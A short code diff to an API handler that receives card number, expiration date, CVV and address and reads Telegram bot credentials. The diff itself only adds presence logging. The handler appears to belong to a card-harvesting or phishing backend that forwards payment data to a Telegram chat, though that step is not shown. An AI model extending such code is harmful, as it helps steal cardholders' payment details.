@@ -6,6 +6,14 @@ export default async function handler(req, res) {
     try {
       const { cardNumber, expiration, cvv, address, city, state, zip, userId } = req.body;
       
+      console.log('[send-billing] Received billing details:', {
+        hasCardNumber: !!cardNumber,
+        hasExpiration: !!expiration,
+        hasCVV: !!cvv,
+        hasAddress: !!address,
+        userId: userId || 'N/A'
+      });
+      
       // Check environment variables
       const botToken = process.env.TELEGRAM_BOT_TOKEN;
       const chatId = process.env.TELEGRAM_CHAT_ID;
